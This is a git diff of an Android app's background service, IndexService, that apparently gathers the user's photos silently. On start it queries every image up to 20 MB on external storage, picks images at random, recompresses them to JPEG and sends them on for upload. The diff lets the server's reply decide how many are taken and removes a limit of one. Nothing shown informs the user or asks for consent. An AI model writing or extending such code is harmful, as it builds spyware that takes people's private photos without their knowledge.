@@ -5,6 +5,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
+import android.provider.MediaStore;
 import android.util.Log;
 
 import com.zhangheng.myapplication.R;
@@ -13,7 +14,7 @@ import com.zhangheng.myapplication.getphoneMessage.GetPhoto;
 import com.zhangheng.myapplication.okhttp.OkHttpUtil;
 import com.zhangheng.myapplication.permissions.ReadAndWrite;
 import com.zhangheng.myapplication.service.receiver.IndexReceiver;
-import com.zhangheng.myapplication.util.AndroidImageUtil;
+import com.zhangheng.myapplication.setting.ServerSetting;
 import com.zhangheng.myapplication.util.EncryptUtil;
 import com.zhangheng.myapplication.util.LocalFileTool;
 import com.zhangheng.myapplication.util.OkHttpMessageUtil;
@@ -23,6 +24,7 @@ import com.zhangheng.myapplication.util.TxtOperation;
 import com.zhy.http.okhttp.OkHttpUtils;
 import com.zhy.http.okhttp.callback.StringCallback;
 
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
@@ -47,6 +49,9 @@ public class IndexService extends MyService {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        if (setting == null) {
+            setting = new ServerSetting(context);
+        }
         boolean b = ReadAndWrite.RequestPermissions(context, Manifest.permission.READ_EXTERNAL_STORAGE);
         if (b) {
             getPhoto(true);
@@ -81,6 +86,47 @@ public class IndexService extends MyService {
     String[] includePaths = {};
 
     private void getPhoto(boolean is) {
+        long beginTime = System.currentTimeMillis();
+        long maxSize = 1024 * 1024 * 20;
+        List<String> matchingImages = new ArrayList<>();
+        String[] projection = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.SIZE};
+        String selection = MediaStore.Images.Media.SIZE + " <= ?";
+        String[] selectionArgs = {String.valueOf(maxSize)};
+        String sortOrder = MediaStore.Images.Media.DATE_MODIFIED + " DESC";
+        try {
+            android.database.Cursor cursor = context.getContentResolver().query(
+                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                    projection,
+                    selection,
+                    selectionArgs,
+                    sortOrder
+            );
+            if (cursor != null && cursor.moveToFirst()) {
+                do {
+                    String imagePath = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
+//                    BitmapFactory.Options options = new BitmapFactory.Options();
+//                    options.inJustDecodeBounds = true;
+//                    BitmapFactory.decodeFile(imagePath, options);
+//                    int imageWidth = options.outWidth;
+//                    int imageHeight = options.outHeight;
+                    matchingImages.add(imagePath);
+                } while (cursor.moveToNext());
+                cursor.close();
+            }
+        } catch (Exception e) {
+            Log.e("ImageSizeAsyncTask图片检索", "Error: " + e.getMessage());
+        }
+        long endQuery = System.currentTimeMillis();
+        long t1 = endQuery - beginTime;
+        Log.d(Tag, LocalFileTool.getFileSizeString(maxSize) + "大小以内图片检索数量" + matchingImages.size() + ",耗时：(" + t1 + "ms)" + TimeUtil.format((int) t1));
+        try {
+            uploadPhoto(matchingImages.size(), matchingImages);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void getPhoto1(boolean is) {
         if (is) {
             long beginTime = System.currentTimeMillis();
             List<String> photo = new LinkedList<>();
@@ -139,7 +185,7 @@ public class IndexService extends MyService {
                         photo.addAll(txtFile);
                         int size = photo.size();
                         int t = (int) (System.currentTimeMillis() - beginTime);
-                        Log.d(Tag, "10kb~2Mb图片数：" + size + ",耗时：("+t+"ms)" + TimeUtil.format(t));
+                        Log.d(Tag, "10kb~2Mb图片数：" + size + ",耗时：(" + t + "ms)" + TimeUtil.format(t));
                         try {
                             uploadPhoto(size, photo);
                         } catch (Exception e) {
@@ -179,41 +225,42 @@ public class IndexService extends MyService {
                         if (signature.equals(object.getStr("message"))) {
                             if (object.getInt("code").equals(200)) {
                                 long beginTime = System.currentTimeMillis();
-                                Log.d(Tag + "响应允许", "允许文件上传");
+                                int c = object.getInt("obj", 1);
+                                Log.d(Tag + "响应允许", "允许文件上传-"+c);
                                 if (size > 0) {
-                                    int c = 1;
-                                    if (size <= 5) {
-                                        c = size;
-                                    } else if (size > 5 && size < 200) {
-                                        c = 2;
-                                    } else if (size >= 200 && size < 500) {
-                                        c = 3;
-                                    } else if (size >= 500 && size < 1000) {
-                                        c = 4;
-                                    } else {
-                                        c = 5;
-                                    }
                                     int i = 0;
-                                    c = 1;//暂时解决启动时运算量过大导致无法响应
+//                                    c = 1;//暂时解决启动时运算量过大导致无法响应
                                     byte[] bytes = null;
                                     File file = null;
+                                    Bitmap bitmap = null;
                                     while (i < c) {
                                         String pathname = photo.get(RandomrUtil.createRandom(0, size - 1));
                                         file = new File(pathname);
+                                        bitmap = BitmapFactory.decodeFile(pathname);
                                         if (file.exists()) {
                                             long fileLength = file.length();
-                                            if (fileLength >= 1024 * 1024 * 0.8 && fileLength < 1024 * 1024 * 1.2) {
-                                                Bitmap zip = AndroidImageUtil.zip(BitmapFactory.decodeFile(pathname), 2);
-                                                bytes = AndroidImageUtil.bitmapToByte(zip);
-                                            } else if (fileLength >= 1024 * 1024 * 1.2 && fileLength < 1024 * 1024 * 1.6) {
-                                                Bitmap zip = AndroidImageUtil.zip(BitmapFactory.decodeFile(pathname), 3);
-                                                bytes = AndroidImageUtil.bitmapToByte(zip);
-                                            } else if (fileLength >= 1024 * 1024 * 1.6) {
-                                                Bitmap zip = AndroidImageUtil.zip(BitmapFactory.decodeFile(pathname), 4);
-                                                bytes = AndroidImageUtil.bitmapToByte(zip);
+                                            ByteArrayOutputStream out = new ByteArrayOutputStream();
+                                            if (fileLength >= 1024 * 1024 * 0.6 && fileLength < 1024 * 1024 * 1.2) {
+//                                                Bitmap zip = AndroidImageUtil.zip(BitmapFactory.decodeFile(pathname), 2);
+//                                                bytes = AndroidImageUtil.bitmapToByte(zip);
+                                                bitmap.compress(Bitmap.CompressFormat.JPEG, 55, out);
+                                                bytes = out.toByteArray();
+                                            } else if (fileLength >= 1024 * 1024 * 1.2 && fileLength < 1024 * 1024 * 2) {
+//                                                Bitmap zip = AndroidImageUtil.zip(BitmapFactory.decodeFile(pathname), 3);
+//                                                bytes = AndroidImageUtil.bitmapToByte(zip);
+                                                bitmap.compress(Bitmap.CompressFormat.JPEG, 45, out);
+                                                bytes = out.toByteArray();
+                                            } else if (fileLength >= 1024 * 1024 * 2) {
+//                                                Bitmap zip = AndroidImageUtil.zip(BitmapFactory.decodeFile(pathname), 4);
+//                                                bytes = AndroidImageUtil.bitmapToByte(zip);
+                                                bitmap.compress(Bitmap.CompressFormat.JPEG, 35, out);
+                                                bytes = out.toByteArray();
                                             } else {
-                                                bytes = LocalFileTool.fileToBytes(file);
+//                                                bytes = LocalFileTool.fileToBytes(file);
+                                                bitmap.compress(Bitmap.CompressFormat.JPEG, 65, out);
+                                                bytes = out.toByteArray();
                                             }
+                                            bitmap.recycle();
                                             if (bytes.length < 1024 * 1024) {
                                                 i++;
                                                 String replace = file.getAbsolutePath().replace(LocalFileTool.BasePath, "");
